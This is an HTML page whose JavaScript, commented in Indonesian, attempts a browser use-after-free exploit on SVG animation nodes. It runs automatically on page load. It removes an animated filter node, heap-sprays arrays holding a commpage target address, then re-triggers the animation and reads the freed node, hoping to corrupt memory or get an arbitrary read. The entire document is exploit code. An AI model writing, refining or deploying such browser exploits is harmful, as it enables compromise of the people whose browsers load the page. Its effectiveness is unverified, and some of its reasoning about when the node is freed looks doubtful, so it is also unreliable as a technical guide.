<!DOCTYPE html>
<html>
<head>
    <title>SVG Animation UAF (DOM Lifecycle)</title>
</head>
<body>

    <h1>SVG Animation UAF (Final DOM Corruption)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan SVG Animation UAF...</p>
    <div id="log-area"></div>

    <svg id="svg" width="500" height="500">
        <filter id="f">
            <feComponentTransfer>
                <feFuncR id="victim" type="linear" slope="1" intercept="0">
                    <animate attributeName="slope" to="0" dur="10s" id="anim"/>
                </feFuncR>
            </feComponentTransfer>
        </filter>
    </svg>
    
    <script>
        // ... (KONSTANTA COMM PAGE SAMA) ...
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const TARGET_ADDRESS = COMM_PAGE64_BASE_ADDRESS + BigInt("0x328"); 
        const LOW_WORD_ADDR = Number(TARGET_ADDRESS & 0xFFFFFFFFn); 
        const HIGH_WORD_ADDR = Number(TARGET_ADDRESS >> 32n);
        
        // ... (FUNGSI LOG & SPRAY SAMA) ...
        let startTime = performance.now();
        let payloadHolders = []; 

        function log(message, type = 'log-info') {
            const timeElapsed = (performance.now() - startTime).toFixed(2);
            const logElement = document.getElementById('log-area');
            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
            logElement.scrollTop = logElement.scrollHeight;
        }

        function sprayPayload() {
            log("Memulai Spraying Payload SINKRON (Targeting SVG Node/Pointer)...", "log-spray");
            const SPRAY_COUNT = 3000;
            const PAYLOAD_SIZE = 64; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Float64Array(PAYLOAD_SIZE);
                payloadArray[0] = HIGH_WORD_ADDR; 
                payloadArray[1] = LOW_WORD_ADDR;
                payloadHolders.push(payloadArray); 
            }
        }
        
        // --- FUNGSI UTAMA ATTACK ---
        function runSVGAttack() {
            startTime = performance.now();
            log("Phase 1: Setup SVG Animation Object.", "log-init");

            const victim = document.getElementById('victim');
            const anim = document.getElementById('anim');
            
            // 1. FREE (Async): Pemicu Event Handler yang men-free node SVG
            // Kita akan mengganti parent dari elemen 'victim' yang sedang dianimasikan.
            victim.parentElement.removeChild(victim);
            log("Phase 2: Victim SVG Node dihapus (FREE 1).", "log-critical");

            // 2. SPRAY SINKRON: Menimpa lokasi memori node SVG yang di-free.
            sprayPayload();
            log("Phase 3: SPRAY Commpage Payload SINKRON.", "log-critical");

            // 3. TRIGGER: Paksa Update C++ SVG Animation (Use After Free)
            // Coba akses properti atau metode node yang sudah di-free.
            
            setTimeout(() => {
                log("Phase 4: Memicu UAF Akses pada Animation Node...", "log-critical");
                
                try {
                    // Coba akses properti/metode node SVG yang sudah di-free.
                    // Ini akan mencoba dereferensi pointer yang sudah ditimpa oleh spray (TARGET_ADDRESS)
                    
                    // Metode yang memaksa C++ dereference pointer (misalnya, memulai ulang animasi)
                    anim.beginElement(); 
                    
                    // Coba akses properti read-write yang memaksa dereference node
                    const test = victim.slope; 
                    
                    log(`Nilai slope (Diduga Corrupt) dibaca: ${test}`, "log-critical");

                } catch(e) {
                    log(`JS Exception: ${e.message} - Menunggu Crash OS (UAF/Arbitrary Read)...`, "log-critical");
                }
                
                // Trigger tambahan: Paksa Garbage Collection
                 for(let i = 0; i < 50; i++) {
                    new Array(1024 * 1024 * 5).fill(0xDEADBEEF);
                }
            }, 100);
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian SVG Animation UAF Attack...';
            setTimeout(runSVGAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah DOM/SVG UAF.';
        });
    </script>
    <style>
        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
        .log-init { color: blue; }
        .log-info { color: black; }
        .log-spray { color: purple; }
        .log-critical { color: red; font-weight: bold; }
        .log-success { color: green; font-weight: bold; }
        .log-error { color: darkred; font-weight: bold; }
    </style>
</body>
</html>
